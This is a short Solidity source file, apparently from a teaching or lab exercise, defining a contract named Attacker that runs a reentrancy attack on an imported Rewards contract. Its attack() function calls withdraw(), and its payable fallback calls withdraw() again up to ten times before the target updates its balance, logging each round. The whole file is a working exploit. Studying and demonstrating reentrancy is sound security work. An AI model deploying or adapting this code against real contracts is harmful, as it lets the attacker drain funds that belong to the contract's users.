
pragma solidity ^0.4.8;
import "./Rewards.sol";

contract Attacker {
    Rewards r;
    uint public count;
    event LogFallback(uint count, uint balance);
    event printCount(uint count);


    constructor(address rewards) public payable { r = Rewards(rewards);count=0; }


    function attack() public { r.withdraw(); }

    function () payable public {
        count++;

        emit printCount(count);

        address a = this;
        emit LogFallback(count, a.balance);     // make log entry
        if(count < 10) r.withdraw();            // limit number of withdrawals
    }

    function getBalance() public constant returns(uint) { 
        address a = this;
        return a.balance;
    }   

    function getTargetBalance() public constant returns(uint) { 
        address a = r;
        return a.balance; 
    }   
}